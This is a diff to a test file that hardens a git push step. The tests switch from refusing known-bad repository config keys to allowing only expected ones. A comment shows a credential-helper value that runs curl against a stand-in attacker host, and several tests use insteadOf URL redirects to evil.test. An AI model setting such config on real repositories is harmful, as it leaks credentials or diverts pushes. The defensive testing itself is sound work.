@@ -9,7 +9,7 @@ import {
 	needsCheckout,
 	isSameRepo,
 	pushCredentialEnv,
-	unsafeConfigKeys,
+	unexpectedConfigKeys,
 	gitEnvFrom,
 	GIT_SAFE_ARGS,
 	pushUrlFor,
@@ -533,17 +533,17 @@ describe("the repository's own git config must not steer the push", () => {
 		// with url."https://evil.test/".insteadOf "https://github.com/" set
 		// reports `failed to push some refs to 'https://evil.test/acme/shop.git'`.
 		// Naming the URL on the command line is NOT enough.
-		assert.deepEqual(unsafeConfigKeys("url.https://evil.test/.insteadOf\ncore.bare"), [
+		assert.deepEqual(unexpectedConfigKeys("url.https://evil.test/.insteadOf\ncore.bare"), [
 			"url.https://evil.test/.insteadOf",
 		])
-		assert.deepEqual(unsafeConfigKeys("url.https://evil.test/.pushInsteadOf"), [
+		assert.deepEqual(unexpectedConfigKeys("url.https://evil.test/.pushInsteadOf"), [
 			"url.https://evil.test/.pushInsteadOf",
 		])
 	})
 
 	test("a credential helper is refused — git runs it as a shell command", () => {
 		// `credential.helper=!curl evil.test -d` executes on the first 401.
-		assert.deepEqual(unsafeConfigKeys("credential.helper"), ["credential.helper"])
+		assert.deepEqual(unexpectedConfigKeys("credential.helper"), ["credential.helper"])
 	})
 
 	test("the keys that run a program are refused", () => {
@@ -568,12 +568,31 @@ describe("the repository's own git config must not steer the push", () => {
 			"include.path",
 			"includeIf.gitdir:/x.path",
 		]) {
-			assert.deepEqual(unsafeConfigKeys(key), [key], `${key} must be refused`)
+			assert.deepEqual(unexpectedConfigKeys(key), [key], `${key} must be refused`)
 		}
 	})
 
 	test("case does not matter — git lowercases section and key names", () => {
-		assert.deepEqual(unsafeConfigKeys("CREDENTIAL.HELPER"), ["CREDENTIAL.HELPER"])
+		assert.deepEqual(unexpectedConfigKeys("CREDENTIAL.HELPER"), ["CREDENTIAL.HELPER"])
+		assert.deepEqual(unexpectedConfigKeys("CORE.FILEMODE"), [])
+	})
+
+	/**
+	 * The point of an allow list: a key nobody has thought about yet is
+	 * refused without anyone having to add it. git gains config keys with
+	 * every release, and several of them run programs.
+	 */
+	test("a key we have never heard of is refused by default", () => {
+		assert.deepEqual(unexpectedConfigKeys("some.future.hook"), ["some.future.hook"])
+		assert.deepEqual(unexpectedConfigKeys("http.sslVerify"), ["http.sslVerify"])
+		assert.deepEqual(unexpectedConfigKeys("http.curloptResolve"), ["http.curloptResolve"])
+		assert.deepEqual(unexpectedConfigKeys("core.worktree"), ["core.worktree"])
+		assert.deepEqual(unexpectedConfigKeys("extensions.worktreeConfig"), ["extensions.worktreeConfig"])
+	})
+
+	test("a bare http.extraheader is refused; only a scoped one is expected", () => {
+		assert.deepEqual(unexpectedConfigKeys("http.extraheader"), ["http.extraheader"])
+		assert.deepEqual(unexpectedConfigKeys("http.https://github.com/.extraheader"), [])
 	})
 
 	/**
@@ -594,13 +613,15 @@ describe("the repository's own git config must not steer the push", () => {
 			"branch.main.merge",
 			"user.name",
 			"user.email",
-			"safe.directory",
+			// safe.directory is deliberately absent: actions/checkout writes it
+			// to a TEMPORARY GLOBAL config, and we read local + worktree only.
+			"gc.auto",
 		].join("\n")
-		assert.deepEqual(unsafeConfigKeys(afterCheckout), [])
+		assert.deepEqual(unexpectedConfigKeys(afterCheckout), [])
 	})
 
 	test("nothing in, nothing out", () => {
-		for (const empty of ["", "   ", undefined, null]) assert.deepEqual(unsafeConfigKeys(empty), [])
+		for (const empty of ["", "   ", undefined, null]) assert.deepEqual(unexpectedConfigKeys(empty), [])
 	})
 })
 
